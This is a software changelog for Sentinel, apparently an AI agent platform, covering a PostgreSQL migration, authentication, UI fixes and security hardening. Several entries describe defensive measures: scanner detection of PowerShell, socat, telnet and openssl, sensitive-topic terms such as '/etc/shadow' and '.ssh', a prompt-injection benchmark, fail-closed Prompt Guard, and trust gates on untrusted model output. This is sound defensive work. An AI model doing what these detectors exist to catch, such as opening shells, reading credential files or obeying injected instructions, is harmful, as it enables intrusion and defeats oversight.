# Changelog

All notable changes to Sentinel. Uses [Keep a Changelog](https://keepachangelog.com/) categories.

For v0.1 migration history (Phases 0-6), see `archive/2026-02-17_v0.1-migration-changelog.md`.

---

## v0.5.0 — 2026-03-28

The autonomy and hardening release. Multi-user authentication, goal verification with planner-as-judge, deterministic anchor allocation, cross-language code fixer, and a complete 17-module security audit remediation.

### Added
- **Multi-user authentication** — JWT-based auth with PIN login, per-user workspaces, settings panel, admin user management. Session keys and credentials managed via Podman secrets. 1-hour token TTL with JTI revocation
- **Goal verification** — planner-as-judge system with 3-tier verification (tool output scan → assertion evaluation → planner judgement). Stagnation detection triggers judge-driven replanning. 7 assertion types with path sandboxing
- **Anchor allocator** — deterministic structural anchors for `file_patch` targeting. AST-based parsers for Python, HTML, CSS, Shell, YAML, JSON, TOML. Tiered allocation (unique → positional → line-range), idempotent re-allocation, episodic memory integration
- **Cross-language code fixer** — detects and repairs when the worker outputs code in the wrong language (e.g. Python in a JS file). Structural integrity validation as final pipeline step
- **Plan-outcome memory** — episodic records now store full plan JSON, phase tracking, compact plan lines, and `[PARTIAL]`/`[ABANDONED]` markers for learning from failures
- **Log viewer** — browser-based SSE log viewer with task filtering, clickable task IDs, CRLF normalisation
- **GitHub release tooling** — manifest-based sanitisation script, paranoia scan, allowlist-only file copying

### Changed
- **Planner model: Opus 4.6** — switched from Sonnet 4.6 for episodic memory seeding quality
- **Scanner hardening** — Unicode escape decoding, expanded vulnerability fingerprints, PowerShell/PHP/socat/telnet/openssl detection, structured debug logging, strict mode for execution-bound output, context classifier extraction
- **5,252 Python + 50 Rust** unit tests (up from 4,550 + 50 in v0.4.0)

### Fixed
- Rate limiter was a no-op — `SlowAPIMiddleware` now registered
- Cross-user streaming isolation (SSE, WebSocket, logs)
- Workspace path isolation for sites and file tools
- CSP compliance — all JS extracted to external files
- IMAP handler audit (1 HIGH closed)
- Executor: session reset, dispatch caching, encoding, `max_results` parsing

### Security
- **17/17 audit modules complete** — 175 findings across orchestrator, executor, code fixer, scanner, routines, sandbox, episodic memory, approval, provenance, policy engine, and UI. 0 HIGH remaining
- **JWT hardening** — 1-hour TTL, JTI tracking, revocation set, CSRF origin check
- **Auth isolation** — per-user memory, webhooks, routines, sessions. Admin pool for login bypass of RLS
- **`spawn_task()` for ContextVar propagation** — user-scoped async tasks prevent cross-user context leaks
- **Injection benchmark** — 130 tests, 0 exploits (expanded from 105 in v0.4.0)
For v0.2-v0.3 detail (2026-02-17 to 2026-02-22), see `archive/2026-02-23_changelog-v0.2-to-v0.3.md`.

---

## 2026-03-06

### Fixed
- **Provenance gate blocks messaging tool sends (regression)** — Commit `3473366` changed `is_trust_safe_for_execution()` to return False for unknown data_ids, which correctly blocks untrusted execution but also blocked outbound messaging (signal_send, telegram_send, email_send) where Qwen's output IS the message content. Added messaging tools to the same content-creation exemption as `website` in the provenance gate (`orchestrator.py:1663`). These tools deliver content to the user (display-like), not into system execution. Scanning pipeline runs before the gate. Only applies at TL4+
- **Runtime `.db` attribute errors after SQLite removal** — `orchestrator.py` (4 refs) and `mcp_server.py` (2 refs) still referenced `memory_store.db` (old SQLite connection attribute). Added `pool` property to `MemoryStore` exposing `_pool` for `hybrid_search` callers. Changed all references to `memory_store.pool`
- **asyncpg datetime type errors in routine store** — `create()` passed `next_run_at` as ISO string to asyncpg TIMESTAMPTZ param (expected native datetime). `update_run_state()` same issue with `last_run_at`/`next_run_at`. Fixed by wrapping with `_iso_to_dt()` at the asyncpg boundary. Routine creation and cron scheduling now work correctly

### Changed
- **SQLite removal chunk 8 — cleanup** — Replaced all FTS5 references in comments/docstrings with "full-text" or "tsvector" (17 edits across 10 files in sentinel/ and tests/). Moved 3 legacy SQLite migration scripts to `scripts/legacy/`. Renamed `test_provenance_sqlite.py` → `test_provenance_inmemory.py` (tests in-memory store, not SQLite). Updated `store_protocols.py` docstring (PostgreSQL + in-memory only). Updated `episodic.py` module docstring (removed SQLite translation framing). Final sweep: zero stale SQLite/FTS5 refs in source code. No logic changes
- **SQLite removal chunk 5 — routine store + webhook consolidated** — Merged 2 PG store pairs into canonical files: `store_pg.py` → `store.py` (RoutineStorePg → RoutineStore, Routine dataclass + _now_iso/_dt_to_iso/_row_to_routine helpers), `webhook_pg.py` → `webhook.py` (WebhookRegistryPg → WebhookRegistry, WebhookConfig dataclass + HMAC verification/timestamp/idempotency/RateLimiter helpers). Both `_pg.py` files deleted. `pool=None` in-memory dict fallback for both stores. Updated app.py imports (both PG branch + SQLite fallback branch constructor calls). 10 test files updated: 2 unit tests (routine_store, routine_security — SQLite fixtures → pool=None, cascade/SQL inspection tests converted), 2 PG tests (import paths + class names), 6 capability tests (routines, heartbeat, multiturn_routines, webhooks, error_handling, webui_routines — all SQLite→pool=None). engine.py imports auto-resolved (path unchanged). 3,111 tests pass
- **SQLite removal chunk 4 — memory stores consolidated** — Merged 3 PG store pairs into canonical files: `chunks_pg.py` → `chunks.py` (MemoryStorePg → MemoryStore), `search_pg.py` → `search.py` (PG tsvector/pgvector functions replace SQLite FTS5), `episodic_pg.py` → `episodic.py` (EpisodicStorePg → EpisodicStore). Dataclasses (MemoryChunk, SearchResult, EpisodicRecord, EpisodicFact) and helpers kept in canonical files. All 3 `_pg.py` files deleted. `pool=None` in-memory dict fallback for all stores. Updated app.py imports, 8 dedicated test files, 3 capability test files (heartbeat, cross-layer, webui-memory). 3,111 tests pass
- **SQLite removal chunk 3 — session store consolidated** — Merged `SessionStorePg` into `SessionStore` in `sentinel/session/store.py`. Extracted shared models (Session, ConversationTurn dataclasses, `_now_iso`, `_elapsed_seconds` helpers) from old SQLite store into consolidated file. Added `pool=None` in-memory dict fallback for tests. Deleted `sentinel/session/store_pg.py`. Renamed class `SessionStorePg` → `SessionStore`. Updated app.py (removed store_pg import, changed constructor call), 5 test files (replaced SQLite fixtures with in-memory, updated import paths). 3,152 tests pass
- **SQLite removal chunk 2b — routine engine consolidated** — Merged `RoutineEnginePg` methods (record_start, record_completion, cleanup_stale, get_execution_history, get_execution_stats) into `RoutineEngine`. Removed `import sqlite3`, `db: sqlite3.Connection` parameter, and all inline SQLite code. Added `pool=None` in-memory dict fallback for tests. Deleted `sentinel/routines/engine_pg.py`. Updated app.py (removed RoutineEnginePg import/delegation) and 8 test files (replaced SQLite queries with get_execution_history() and _mem_executions). 3,203 tests pass
- **SQLite removal chunk 2a — 4 PG stores renamed to canonical** — Provenance (`ProvenanceStorePg` → `ProvenanceStore`), Approval (`ApprovalManagerPg` → `ApprovalManager`), Metrics (`metrics_pg.py` → `metrics.py`), DB Maintenance (`db_pg.py` → `db_new.py`). Each PG class gets `pool=None` in-memory dict fallback for tests. Module-level helpers (set_default_store, create_tagged_data, etc.) and dataclasses (ApprovalEntry, ApprovalResult) merged into canonical files. SQLite originals deleted. All imports updated across source + 8 test files. 3,203 tests pass

### Changed
- **SQLite removal plan — verification corrections** — Incorporated results from codebase-wide verification into `docs/design/2026-03-06_sqlite-removal-plan.md`. Added 4 missing files with FTS5 refs (orchestrator, planner, mcp_server, memory/__init__), corrected pool=None fallback status (only 2/11 PG stores have it), fixed app.py branching locations (line 642 is `pg_pool` check not `database_backend`), corrected compose env var (`SENTINEL_DB_PATH` not `SENTINEL_DATABASE_BACKEND`), added missing `validate_f1_f2.py` script, added new Section 6 documenting import chain dependencies between PG and SQLite files

### Fixed
- **WS completed event missing step_results** — Orchestrator's `completed` WebSocket event only sent `{status, plan_summary, elapsed_s}`. UI's `renderStepResults()` expected `step_results` and `response` fields. Added both to the event payload. `step_results` serialised with safe fields only (`step_id`, `status`, `content`, `error`) — excludes verbose/internal fields (`worker_response`, `planner_prompt`, `resolved_prompt`). Content is post-scan (output scanning happens before step results are appended)
- **UI planner step results not shown incrementally** — `step_completed` WS handler only updated spinner text ("Step X completed"), never rendered content. Now renders each step's `content_preview` as it arrives in a growing step-results block. `completed` handler replaces incremental (truncated) results with full `step_results` content. Fast-path path unaffected (no `step_results`)

## 2026-03-05

### Fixed
- **UI fast-path display (complete)** — Fast-path results showed "Task completed." in Web UI instead of actual content. Three root causes fixed: (1) `websockets` library missing from dependencies — uvicorn fell back to HTTP polling (prior commit); (2) UI only checked `data.plan_summary`, not `data.response` (prior commit); (3) **WebSocket task lifecycle never reset `isProcessing`/input state** — after any WS task completed, input was permanently disabled. Also added: `blocked` event handler (fast-path scan blocks use a separate event name), `error` status handling in completed events, 60s timeout for unresponsive tasks, cleanup of in-flight resolvers on WS disconnect, error event processing state reset
- **Containerfile PG15→PG17** — `postgresql-server-dev-15` no longer in Debian Trixie repos. Updated to `postgresql-server-dev-17`
- **Provenance empty-chain semantic bug** — `is_trust_safe_for_execution()` returned `True` for unknown `data_id`s (Python `all([])` is `True`). Unknown data now returns `False` (unknown ≠ trusted). Fixed in both SQLite and PostgreSQL implementations. Only 1 production caller (`orchestrator.py:_execute_tool_call`); in normal flow data_ids always have provenance records, but edge cases (store eviction, DB cleanup, data loss) now correctly block execution

### Added
- **PostgreSQL store test coverage** — 31 new tests across 6 PG store test files (118→149 PG tests). Covers: `list_by_file()` JOIN query, bidirectional shadow linking, multi-parent trust inheritance, empty chain edge case, count_for_user, auto-generated fact IDs, None timestamps, duration filtering, JSONB casts, window values. 3,279 total tests passing

### Added
- **PostgreSQL Phase 4: Data migration + validation tooling** — `scripts/migrate_sqlite_to_pg.py` migrates all 13 tables from SQLite to PostgreSQL in FK dependency order with type conversions (INTEGER→bool, TEXT→datetime, TEXT→JSONB). Embedding migration path included (currently no-op — nomic-embed-text not loaded). Uses `INSERT ... ON CONFLICT DO NOTHING` for idempotency. `scripts/validate_migration.py` compares row counts between both backends as a post-migration sanity check. `docs/postgresql-setup.md` documents enabling PostgreSQL, first-start behaviour, migration workflow, switching back, tuning, backup, and troubleshooting. 29 new tests

### Fixed
- **RoutineEngine PG gap** — `RoutineEngine` gains `execution_store` parameter for delegating DB operations (`record_start`, `record_completion`, `cleanup_stale`, `get_execution_history`, `get_execution_stats`) to a backend-specific store. On the PG path, `app.py` passes `RoutineEnginePg(pool)`. On SQLite, falls back to inline `self._db` code. `_record_execution_result` now async. Previously, execution history was silently skipped on the PostgreSQL path

### Changed
- **Config-based store backend selection (PostgreSQL migration Phase 3b.5)** — `app.py` lifespan now branches on `settings.database_backend`: when `"postgresql"`, creates all PG store instances (`SessionStorePg`, `MemoryStorePg`, `ProvenanceStorePg`, `RoutineStorePg`, `WebhookRegistryPg`, `ApprovalManagerPg`) with the asyncpg pool; when `"sqlite"` (default), existing SQLite stores unchanged. Two new module-level globals (`_hybrid_search_fn`, `_get_metrics_fn`) provide backend-switchable function references for the search and metrics endpoints. `ApprovalManager` creation branched for PG/SQLite. Shutdown sequence guards `db_conn` operations (None for PG). Downstream code unchanged — both backends satisfy the same async Protocol. 6 new tests, 3,220 total passing. **Phase 3b complete**
- **Async store callers + test migration (PostgreSQL migration Phase 3b.3+3b.4)** — All production code callers of store methods now use `await`: 10 files updated (orchestrator.py×47 calls, executor.py×37, app.py×26, plus router, fast_path, channels, pipeline, heartbeat, a2a, mcp_server). `_website_list()`, `_record_turn()`, `seed_heartbeat_routine()` made async to support internal await. 42 test files converted: sync test functions→async, `MagicMock`→`AsyncMock` for mocked async methods, `.count` property→`await .get_count()`, fixtures made async where they call `reset_store()`. 3,214 tests passing, 0 regressions

### Added
- **PostgreSQL remaining store backends (Phase 3a: 3.3+3.4+3.7+3.9+3.11)** — Five async store classes completing Phase 3a: `ProvenanceStorePg` (`sentinel/security/provenance_pg.py`): recursive CTE with `CROSS JOIN LATERAL jsonb_array_elements_text()` for provenance chain walking, `INSERT ... ON CONFLICT DO UPDATE` for file_provenance upsert. `ApprovalManagerPg` (`sentinel/core/approval_pg.py`): JSONB plan storage (asyncpg returns native dict, cast on insert), `NOW() + INTERVAL` for expiry, `::timestamptz` cutoffs for metrics. `EpisodicStorePg` (`sentinel/memory/episodic_pg.py`): tsvector search via `plainto_tsquery` + `ts_rank_cd` (no manual FTS sync — GENERATED ALWAYS AS STORED), `EXTRACT(EPOCH FROM ...)` age calculation for prune_stale, FK ON DELETE CASCADE handles file_index + facts cleanup, shadow entry creation via async MemoryStorePg. `MetricsPg` (`sentinel/api/metrics_pg.py`): async wrapper generating ISO 8601 cutoff timestamps instead of SQLite strftime() expressions. `db_pg` (`sentinel/core/db_pg.py`): PostgreSQL maintenance functions (audit_log + routine_executions purge with `INTERVAL`, no VACUUM needed — autovacuum). 85 new tests with mock asyncpg pool. Phase 3a complete
- **PostgreSQL MemoryStore + Search (Phase 3a: 3.2+3.10)** — `MemoryStorePg` (`sentinel/memory/chunks_pg.py`): async CRUD for memory_chunks with auto-generated tsvector (no FTS sync needed), pgvector embedding stored as `'[0.1,0.2,...]'` string (no `struct.pack`), system-protected delete guard. `SearchPg` (`sentinel/memory/search_pg.py`): `fts_search()` uses `plainto_tsquery('english', $1)` + `ts_rank_cd()` (replaces FTS5 MATCH + BM25), `vec_search()` uses `<=>` cosine distance with `1 - distance` similarity (replaces sqlite-vec MATCH), `hybrid_search()` with same RRF fusion logic. Reuses `SearchResult` dataclass from SQLite module. 40 new tests with mock asyncpg pool
- **PostgreSQL store backends Phase 3a (3.1+3.5+3.6+3.8)** — Four async store classes implementing existing Protocols with asyncpg: `SessionStorePg` (session/turn CRUD, risk decay, eviction, 5 metrics methods, per-session locks), `RoutineStorePg` (CRUD with dynamic `$N` SET clause, JSONB config), `WebhookRegistryPg` (CRUD with secret redaction), `RoutineEnginePg` (execution history/stats, recording, stale cleanup with `EXTRACT(EPOCH FROM ...)`). All use `async with pool.acquire()` per operation, `$1`-style params, native BOOLEAN/TIMESTAMPTZ/JSONB types. 64 new tests with mock asyncpg pool
- **PostgreSQL schema with tsvector, pgvector, and GIN indexes (Phase 2.5–2.8)** — `sentinel/core/pg_schema.py` creates all 13 PostgreSQL tables, extensions, and indexes in a single idempotent transaction. Includes: `vector` extension, tsvector `GENERATED ALWAYS AS ... STORED` columns on `memory_chunks` and `episodic_facts` with weighted A/B fields, `vector(768)` embedding column, GIN indexes for FTS, HNSW index for cosine similarity (`m=16, ef_construction=64`), partial index on `routines(enabled, next_run_at)`, FK cascades on all dependent tables. Wired into app.py lifespan — called after asyncpg pool creation when `database_backend=postgresql`. 44 new tests validate SQL structure, table coverage, dependency ordering, idempotency (IF NOT EXISTS), and absence of SQLite-specific constructs. Phase 2 complete
- **PostgreSQL infrastructure foundation (Phase 2.1–2.4+2.9)** — `database_backend` config field selects sqlite (default) or postgresql. Containerfile adds PostgreSQL 15 + pgvector v0.8.0. Entrypoint conditionally runs initdb, configures Unix socket (no TCP), starts pg_ctl. asyncpg connection pool created in FastAPI lifespan when backend=postgresql, stored on `app.state.pg_pool`. Health check gains `pg_ready` field. SQLite path fully unchanged — both run until Phase 3 migrates stores. 12 new tests
- **Store Protocol definitions (PostgreSQL migration Phase 1.1)** — `sentinel/core/store_protocols.py` defines `@runtime_checkable` Protocol classes for all 8 store interfaces: `SessionStoreProtocol`, `MemoryStoreProtocol`, `ProvenanceStoreProtocol`, `ApprovalManagerProtocol`, `RoutineStoreProtocol`, `RoutineEngineProtocol`, `EpisodicStoreProtocol`, `WebhookRegistryProtocol`. Each protocol matches the exact public method signatures of the existing implementation. Static type-check assertions added at the bottom of each store module (`if TYPE_CHECKING: _: XProtocol = cast(XProtocol, Store(...))`). These are the contracts any backend (SQLite, PostgreSQL, in-memory) must satisfy. Phase 1 complete

### Changed
- **Session DTO conversion (PostgreSQL migration Phase 1.2)** — `Session` dataclass is now a pure DTO with no SQLite reference. Removed `_db` field and all direct SQL writes from `add_turn()`, `lock()`, `set_task_in_progress()`, `apply_decay()`. Five new `SessionStore` methods absorb the persistence: `add_turn()`, `lock_session()`, `set_task_in_progress()`, `apply_decay()`, `clear_turns()`. Each method has both SQL and in-memory paths (RoutineStore pattern). 12 caller sites updated (orchestrator×10, router×1, fast_path×1). `FastPathExecutor` now accepts `session_store` parameter. 25 new tests (`test_session_store.py`), 2939 total passing
- **Store fallbacks + metrics rehousing (PostgreSQL migration Phase 1.3–1.6)** — ApprovalManager and EpisodicStore gain dual-mode constructors (`db: sqlite3.Connection | None`): SQL when db provided, in-memory dict fallback otherwise. ApprovalManager adds `ApprovalEntry` dataclass and `get_status_counts(cutoff)` method; EpisodicStore adds `_mem`, `_file_index`, `_facts` dicts with full CRUD. Metrics module (`sentinel/api/metrics.py`) rewritten — all 6 raw SQL functions replaced by store method calls on SessionStore (5 new methods), ApprovalManager (1), and RoutineEngine (1). `get_metrics()` signature changed from `(db, window)` to `(session_store, approval_manager, routine_engine, window)`. HeartbeatManager.get_latest() refactored to use new `MemoryStore.get_latest_by_source()`. No `.execute()` calls remain in metrics.py or heartbeat.py. 34 new approval tests, 18 new episodic tests, 2969 total passing

### Added
- **Database assessment: SQLite → PostgreSQL** — comprehensive evaluation added to `docs/design/2026-03-02_untrusted-data-architecture-brainstorm.md`. Covers current SQLite limitations for multi-user (no RLS, single sync connection, no encryption), PostgreSQL advantages (row-level security, connection pooling, `pgcrypto` column encryption, `asyncpg` async driver), in-container deployment architecture (Unix socket, no third container), encryption options (volume-level, column-level, hybrid), SQLCipher rejection rationale, and phased migration strategy. Decision pending
- **Router & Fast Path** — new `sentinel/router/` module with Qwen-based request classification and template-driven fast path execution. Simple requests (calendar, email, search, messaging) bypass the Claude planner entirely for lower latency, lower cost, and stronger privacy (planner never sees email content/addresses). Complex requests fall back to the full planner. Architecture: `MessageRouter` → input scan → `Classifier` (single Qwen call) → `FastPathExecutor` (template registry + tool executor) or `Orchestrator.plan_and_execute()`. 9 day-one templates: `calendar_read`, `calendar_add`, `email_search`, `email_read` (chain), `web_search`, `x_search`, `signal_send`, `telegram_send`, `memory_search`. Planner override phrases ("use the planner", "plan this", "think about this") short-circuit classification. Feature flag `router_enabled=True` (default). New `plan_and_execute()` orchestrator entry point for pre-scanned requests. `ChannelRouter` updated to route through `MessageRouter` when available. 92 new tests across 7 test files. 2914 Python passed

---

## 2026-03-04

### Added
- **Website serving** — new `website` tool with `create`/`remove`/`list` actions for temporary websites. Qwen generates HTML/CSS/JS, writes to `/workspace/sites/{site_id}/`, served at `https://localhost:3001/sites/{site_id}/`. New `StaticFiles` mount at `/sites` registered before catch-all `/` mount. Security: site_id regex-validated (`^[a-z0-9][a-z0-9-]{0,62}$`), filenames restricted, all writes policy-gated. 20 new tests (`test_website_tool.py`, `test_website_route.py`)

### Fixed
- **Website serving bugfixes (4 issues from live testing)** — (1) `/sites` paths exempted from PIN auth middleware — browsers don't send `X-Sentinel-Pin` header on direct navigation (`auth.py`). (2) `resolve_args()` and `get_referenced_data_ids_from_args()` now recurse into nested dicts — fixes `{"index.html": "$dashboard_html"}` resolving to literal `$dashboard_html` (`orchestrator.py`). (3) Provenance trust gate exempted for `website` tool at TL4+ — Qwen output is always UNTRUSTED but website content is display-only, not executed (`orchestrator.py`). (4) Relaxed CSP for `/sites` paths — `script-src 'self' 'unsafe-inline'` allows inline JS in LLM-generated HTML; main UI CSP unchanged (`middleware.py`). 3 new tests (`test_middleware.py`, `test_orchestrator.py`). 2822 Python passed
- **FIX-19: Documentation and missing context (8 findings)** — `handle_message()` comment explains async event bus delivery pattern (U1/WHY-1). `_flush_pruned_turns()` list_chunks() call now uses `source="system:session_prune"` filter instead of scanning all chunks — turns O(n) dedup into O(1) with indexed WHERE clause (U2/HANG-2). Think/RESPONSE tag stripping comment rewritten to explain Qwen3 thinking mode architecture leakage and tagged output format origin (U2/WHY-1). Three `POST-TEST REVIEW` TODOs replaced with `REVIEWED (B2 red team, 0 S0/S1)` resolved comments — data feeds planner (trusted), side-channel risk outside threat model (U2/WHY-2). `_NUM_PREDICT` constant moved to `sentinel/core/config.py` as `OLLAMA_NUM_PREDICT` — imported by both `quality_gate.py` and `ollama.py`, eliminating duplication and circular import risk (U3/WHY-1). `_CODE_EXTENSIONS` frozenset moved from inside `_file_write()` to module level in `executor.py` — no longer recreated per call (U4/WHY-2). Structured logging added to all IMAP and CalDAV public async functions — operation name, key params (truncated), result count, elapsed time (U6/TRACE-1). Comment on `String::from_utf8_lossy` in sidecar sandbox explaining binary output unsupported, lossy conversion intentional for JSON response (U7/WHY-1). 2605 Python passed (221 pre-existing infra-dependent failures), 8 Rust passed
- **FIX-17: Code simplification (6 findings)** — Health check component-status logic (`_gather_component_status()`) extracted from three duplicate sites: `/health`, `/api/health`, and heartbeat `_health_check()`; each endpoint extends the shared dict with its own fields (U1/SIMP-1). CommandPatternScanner Dockerfile/Makefile exemption logic consolidated into `_is_safe_rm_in_build_context()` helper — replaces 8 near-identical checks across fenced, indented, and top-level contexts (U3/SIMP-1). Per-scanner crash handler in ScanPipeline extracted to `_run_scanner_safe()` static method — used by both `scan_input()` and `scan_output()` (U3/SIMP-2). Executor handler dispatch annotated with deferred-deduplication note — handler-per-tool pattern kept for readability at current tool count (U4/SIMP-1). `RoutineStore.list_event_triggered()` public method added; `RoutineEngine._on_event()` no longer accesses private `_row_to_routine`/`_mem` attributes (U6/HANG-1). `SidecarConfig` derives `Clone`; `SandboxEngine::new` uses `config.clone()` instead of manual field-by-field copy (U7/SIMP-1). 2798 Python passed, 50 Rust passed
- **FIX-18: Hardcoded values to config (5 findings)** — Rate limit values in API decorators moved from hardcoded strings to `settings.rate_limit_tasks` / `settings.rate_limit_routines` using callable lambdas for runtime evaluation (U1/HARD-1). Heartbeat interval moved from hardcoded `asyncio.sleep(1800)` to `settings.heartbeat_interval` with `Field(default=1800, ge=60)` (U1/HARD-2). Direct shell timeout moved from hardcoded `timeout=30` to `settings.shell_timeout` with `Field(default=30, ge=5)`; podman timeouts (build=300s, run=60s, stop=30s) kept as constants with documenting comments (U4/HARD-1). Gmail/Calendar API timeouts already configurable via `settings.gmail_api_timeout` / `settings.calendar_api_timeout` — confirmed executor passes them through, no code change needed (U6/HARD-1). Sidecar `max_timeout_ms` (5min cap) and `stdout_max_bytes` (1 MiB) moved to `SidecarConfig` with `SENTINEL_SIDECAR_MAX_TIMEOUT_MS` / `SENTINEL_SIDECAR_STDOUT_MAX_BYTES` env var overrides; stderr buffer (64KB), epoch interval (500ms), and IO buffer request cap (1 MiB) kept as intentional constants with documenting comments (U7/HARD-1). 2798 Python passed, 50 Rust passed
- **FIX-16: Dead code removal (5/7 findings, 2 invalid)** — `result =` assignment removed in `ChannelRouter.handle_message()` — orchestrator response delivered via event bus, return value unused (U1/DEAD-1). `PlanStep.requires_approval` field removed — approval is plan-level, field never read (U2/DEAD-2). `http_fetch` conditionally excluded from `get_tool_descriptions()` when sidecar unavailable — prevents planner generating plans that always fail (U4/DEAD-1). Dead `vobject` import removed from `_parse_event_from_vevent()` — imported but never referenced, function uses getattr on caldav objects (U6/DEAD-1). `ToolRegistry::register()` removed from sidecar — never called, all tools loaded via `load()` (U7/DEAD-1). Two findings rejected: U1/DEAD-2 (WebSocketChannel import is used at app.py:2266), U2/DEAD-1 (`expects_code` used in approval.py, UI, planner prompt — informational but not dead). 2798 Python passed, 50 Rust passed
- **SYS-3b: task_id propagation — executor, state stores, MCP source_key, sidecar request_id (4 findings)** — MCP `run_task()` now generates `task_id=str(uuid4())` and passes `source_key="mcp:local"` to `handle_task()` (U1/TRACE-2). `ToolExecutor.execute()` reads `task_id` from contextvar and includes it in entry, completion, and sidecar-fallback log extras (U4/TRACE-1). `Session.lock()`, `EpisodicStore.create()`, `MemoryStore.store()`, and `store_with_embedding()` include `task_id` from contextvar in existing log extras (U5/TRACE-1). Sidecar `handle_connection()` logs `request_id` and `tool_name` on request start and completion — structured `[request_id=... tool=...]` format on every request without full tracing crate (U7/TRACE-1). Test updated: `test_run_task_passes_source_key` expects `mcp:local` and verifies `task_id` is non-empty. Completes SYS-3 batch (8/8 findings). 2798 Python passed, 8 Rust passed
- **SYS-3a: task_id propagation — contextvars, HTTP middleware, orchestrator, pipeline (4 findings)** — New `sentinel/core/context.py` module with `current_request_id` and `current_task_id` contextvars plus `get_request_id()` / `get_task_id()` getters (U1/TRACE-1). `RequestCorrelationMiddleware` in `middleware.py` generates UUID per HTTP request, sets contextvar, adds `X-Request-ID` response header — outermost middleware so all downstream code can read it (U1/TRACE-1). `Orchestrator.handle_task()` sets `current_task_id` contextvar after `task_id` resolution, resets in `finally` block — propagates to all downstream code via contextvar without parameter threading (U2/TRACE-1). `ScanPipeline.scan_input()`, `scan_output()`, `process_with_qwen()` summary logs now include `task_id` from contextvar in extras (U3/TRACE-1). `ConversationAnalyzer.analyze()` summary log includes `task_id` from contextvar (U3/TRACE-2). 2798 Python passed
- **FIX-8: Planner validation — tool name check, constraint extraction, refusal regex, tag order (4 findings)** — `_validate_plan()` now accepts optional `available_tool_names` parameter; `create_plan()` passes tool names from `available_tools`, rejecting plans with unknown tool names before any steps execute (U4/VALID-1). Constraint auto-inference (TL4+ side-effect that mutated steps in-place) extracted from `_validate_plan()` into separate `_auto_infer_constraints()` method — called after validation in `create_plan()`, keeping validation pure (U4/VALID-2). Refusal detection `_looks_like_refusal()` converted from plain substring matching to compiled regex patterns with `\b` word boundaries — prevents false positives like "garbage refuse", "harmful chemicals", "violates" matching in legitimate content (U4/VALID-3). `<RESPONSE>` tag stripping in `executor.py` changed from `.index()` (fails if `</RESPONSE>` appears before `<RESPONSE>`) to `re.search()` with non-greedy match — handles malformed tag order gracefully (U4/ERR-2). 2798 Python passed
- **FIX-11: Sidecar input validation — line limits, UTF-8 safe truncate, timeout buffer (5 findings)** — `handle_connection()` in `main.rs` replaced unbounded `BufReader::lines()` with `read_bounded_line()` that reads in BufReader-sized chunks and rejects lines over 2 MiB, preventing OOM from single oversized requests (U7/VALID-1). Shell output `String::truncate()` now finds the nearest char boundary before truncating — prevents panic when `from_utf8_lossy` replacement chars (U+FFFD, 3 bytes) straddle the cut point; applied to both stdout and stderr (U7/HANG-1). Leak detector `"sk-"` pattern narrowed to `"sk-proj-"` for OpenAI keys — eliminates false positives on "task-related", "desk-lamp", "risk-assessment" etc.; Python-side scanner handles full regex+entropy disambiguation (U7/WHY-3). Python `SidecarClient._send_request()` adds 4 MiB length check after `readline()` — raises `ConnectionError` on oversized responses (U7/XREF-1). Python client default timeout bumped from 30s to 35s — 5s buffer over sidecar's 30s execution timeout prevents Python-side timeout racing the Rust-side timeout (U7/XREF-2). 2798 Python passed, 50 Rust passed
- **FIX-10: Periphery validation — config bounds, turn limits, CalDAV UTC, iteration cap (4 findings)** — Pydantic `Field(ge=...)` bounds added to security-critical config settings: `session_ttl` (ge=0), `session_max_count` (ge=1), `session_risk_decay_per_minute` (ge=0), `session_lock_timeout_s` (ge=0), `sandbox_timeout` (ge=1), `sandbox_max_timeout` (ge=1); `@model_validator` ensures `conversation_block_threshold > conversation_warn_threshold` (U5/VALID-1). Session turn loading capped at `LIMIT 200` (most recent, via `ORDER BY id DESC` + reverse) — bounds memory on long-lived sessions while preserving analyzer's detection window (U5/WHY-1). CalDAV `_format_ical_datetime()` now calls `dt.astimezone(timezone.utc)` before applying Z suffix — previously timezone-aware non-UTC datetimes were formatted with Z without conversion, creating events offset by the timezone difference (U6/VALID-1). Routine `max_iterations` hard-capped at 50 via `min()` — prevents unbounded orchestrator call loops from misconfigured routines (U6/VALID-3). 2798 Python passed
- **FIX-7: Orchestrator validation — SAFE_OPS sync, session fallback, limit clamping (5 findings)** — `memory_recall_file` and `memory_recall_session` added to `SAFE_OPS` frozenset in `trust_router.py`, syncing with `_SAFE_HANDLERS` so plans using these read-only tools can auto-approve (U2/VALID-1). `_execute_tool_call` gains `session_id` parameter threaded from `_execute_step`; SAFE handler dispatch injects it into resolved_args when planner omits it, so `_safe_session_info` falls back to execution session instead of raising RuntimeError (U2/VALID-2). `resolve_text()` regex tightened from `\$\w+` to `\$[a-z_][a-z0-9_]*` — only matches planner-style lowercase variables, preventing false-positive matches on `$HOME`/`$PATH`/`$100` in natural language (U2/VALID-3). `json.loads(metadata)` in `_safe_memory_store` wrapped in try/except — invalid JSON treated as None instead of propagating uncaught (U2/VALID-5). All 6 SAFE handlers that accept k/limit values now clamp to `min(value, 100)` — prevents unbounded queries from planner bugs (U2/VALID-6). 2798 Python passed
- **FIX-9: Security stack validation — topic matching, policy schema, fail-closed Prompt Guard (5 findings)** — Sensitive topic detection in `ConversationAnalyzer` converted from plain substring matching to regex patterns with word boundaries — prevents false positives like "token" matching "tokenizer" and "root access" matching "grassroot access"; intentional prefix terms (e.g. "escalat") and path-like terms (e.g. "/etc/shadow", ".ssh") preserved with appropriate matching strategies (U3/VALID-1). `PolicyEngine._normalise_path()` now logs WARNING when `Path.resolve()` falls back to `PurePosixPath` (U3/VALID-2). Policy YAML schema validation added — `_validate_policy()` checks required sections (`file_access`, `commands`) and their expected sub-keys (`read_allowed`, `write_allowed`, `blocked`, `allowed`, `blocked_patterns`, `path_constrained`); raises `ValueError` on missing keys, catching typos like `write_alowed` that would silently result in empty allowlists (U3/VALID-3). `validate_constraint_definitions()` now applies `_METACHAR_RE` check to `allowed_paths` entries, matching existing `allowed_commands` validation (U3/VALID-4). Prompt Guard per-chunk inference failure changed from fail-open (`continue`) to fail-closed — failed chunks now treated as flagged with `prompt_guard_inference_error` match, preventing malicious chunks that cause inference errors from being silently skipped (U3/ERR-1). 2798 Python passed
